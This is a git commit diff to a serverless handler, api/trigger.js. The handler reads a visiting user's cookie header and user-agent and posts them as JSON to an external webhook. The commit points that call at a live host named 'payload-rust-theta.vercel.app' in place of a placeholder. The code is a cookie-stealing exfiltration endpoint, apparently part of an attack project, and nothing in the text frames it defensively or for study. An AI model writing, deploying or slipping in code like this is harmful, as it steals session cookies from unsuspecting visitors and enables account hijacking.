bbe3aceb41ca4370d82b432bf3aa8a82b5176f8a
Dkzin.rlk <79470887+SrDark222@users.noreply.github.com>
2025-07-20 20:47:51 -0300

    Update trigger.js

--- api/trigger.js
+++ api/trigger.js
@@ -2,7 +2,7 @@ export default async function handler(req, res) {
   const cookie = req.headers.cookie || "sem cookie"
   const ua = req.headers['user-agent'] || "sem UA"
 
-  await fetch("https://teu-projeto.vercel.app/api/enviarWebhook", {
+  await fetch("https://payload-rust-theta.vercel.app/api/enviarWebhook", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cookie, ua })
